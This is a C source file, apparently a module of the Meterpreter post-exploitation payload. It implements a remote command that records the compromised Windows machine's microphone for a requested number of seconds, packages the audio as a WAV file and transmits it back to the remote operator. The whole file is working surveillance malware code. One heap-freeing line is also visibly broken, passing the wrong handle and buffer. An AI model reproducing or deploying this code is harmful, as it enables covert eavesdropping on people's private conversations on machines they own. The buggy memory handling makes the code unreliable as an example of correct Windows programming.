#pragma comment(lib, "Winmm.lib")
#include "../../common/common.h"
#include <windows.h>
#include "audio.h"

//Handle used for synchronization. Main thread waits for event to be signalled to clean up
HANDLE recordMicEvent;

//All these default values should be overwritten
UINT buffersize = 0;
UINT riffsize = 0;
PBYTE recordBuffer = NULL;
PBYTE sendBuffer = NULL;
PBYTE dataBuffer = NULL;

//Callback saves data 
void CALLBACK waveInProc(HWAVEIN hwi, UINT uMsg, DWORD_PTR dwInstance, DWORD_PTR dwParam1,DWORD_PTR dwParam2){
	if(uMsg != WIM_DATA)
		return;
	memcpy(dataBuffer, recordBuffer, buffersize);
	SetEvent(recordMicEvent);
}

/*
 * Record from default audio device for X seconds.
 */
DWORD request_ui_record_mic( Remote * remote, Packet * request ){
	DWORD dwResult    = ERROR_SUCCESS;
	Packet * response = NULL;
	HANDLE procHeap = GetProcessHeap();
	UINT seconds;
	DWORD chunkSize;
	DWORD subChunk1Size;
	WAVEFORMATEX wavFormat;
	WAVEFORMATEX wf;
	HWAVEIN hWavIn;
	WAVEHDR wh;

	do{
		response = packet_create_response( request );
		if( !response )
			BREAK_WITH_ERROR( "request_ui_record_mic: packet_create_response failed", ERROR_INVALID_HANDLE )

		//Get duration to record, and reallocate if necessary
		seconds = packet_get_tlv_value_uint(request, TLV_TYPE_AUDIO_DURATION);
		if( buffersize == 0 || buffersize != 11025 * seconds){
			buffersize = 11025 * seconds;
			riffsize = buffersize + 44;
			if (recordBuffer != NULL)
				HeapFree(procHeap, 0, recordBuffer);
			recordBuffer = (PBYTE)HeapAlloc(procHeap, HEAP_ZERO_MEMORY, buffersize);
			if (sendBuffer != NULL)
				HeapFree(sendBuffer, 0, recordBuffer);
			sendBuffer = (PBYTE)HeapAlloc(procHeap, HEAP_ZERO_MEMORY, riffsize);
			if (recordBuffer == NULL || sendBuffer == NULL)
				BREAK_WITH_ERROR("request_ui_record_mic: Allocation failed", GetLastError())
			dataBuffer = sendBuffer + 44;
		}

		//Create file header
		memcpy(sendBuffer, "RIFF", 4);
		chunkSize = buffersize + 36;
		memcpy(sendBuffer+4, &chunkSize, 4);
		memcpy(sendBuffer+8, "WAVE", 4);

		//Subchunk1
		memcpy(sendBuffer+12, "fmt ", 4);
		subChunk1Size = 16;
		memcpy(sendBuffer+16, &subChunk1Size, 4);
		wavFormat.wFormatTag = 1;
		wavFormat.nChannels = 1;
		wavFormat.nSamplesPerSec = 11025;
		wavFormat.nAvgBytesPerSec = 11025;
		wavFormat.nBlockAlign = 1;
		wavFormat.wBitsPerSample = 8;
		memcpy(sendBuffer+20, &wavFormat, 16);

		//Subchunk 2
		memcpy(sendBuffer+36, "data", 4);
		memcpy(sendBuffer+40, &buffersize, 4);

		// Set up WAVEFORMATEX for recording 11 kHz 8-bit mono. Not reusing wavFormat because this uses the cbSize member
		wf.wFormatTag = WAVE_FORMAT_PCM; 
		wf.nChannels = 1; 
		wf.nSamplesPerSec = 11025L; 
		wf.nAvgBytesPerSec = 11025L; 
		wf.nBlockAlign = 1; 
		wf.wBitsPerSample = 8; 
		wf.cbSize = 0;
		dwResult = waveInOpen(&hWavIn, WAVE_MAPPER, &wf, (DWORD_PTR)&waveInProc, NULL, CALLBACK_FUNCTION);
		if(dwResult != MMSYSERR_NOERROR)
			BREAK_WITH_ERROR("request_ui_record_mic: WaveInOpen failed", dwResult) //Open failed
		wh.lpData = (LPSTR)recordBuffer;
		wh.dwBufferLength = buffersize;
		wh.dwFlags = 0;
		waveInPrepareHeader(hWavIn, &wh, sizeof(wh));
		waveInAddBuffer(hWavIn, &wh, sizeof(wh));
		recordMicEvent = CreateEvent( 
			NULL,               // default security attributes
			FALSE,               // auto-reset event
			FALSE,              // initial state is nonsignaled
			NULL);  // no object name
		dwResult = waveInStart(hWavIn);
		if(dwResult != MMSYSERR_NOERROR)
			BREAK_WITH_ERROR("request_ui_record_mic: WaveInStart failed", dwResult)
		WaitForSingleObject(recordMicEvent, seconds * 1000 + 1000);
		dwResult = waveInStop(hWavIn);//seems to wait for buffer to complete
		if(dwResult != MMSYSERR_NOERROR)
			BREAK_WITH_ERROR("request_ui_record_mic: WaveInStop failed", dwResult)
		packet_add_tlv_raw(response, TLV_TYPE_AUDIO_DATA|TLV_META_TYPE_COMPRESSED, sendBuffer, riffsize);
	} while( 0 );

	packet_transmit_response( dwResult, remote, response );
	
	return ERROR_SUCCESS;
}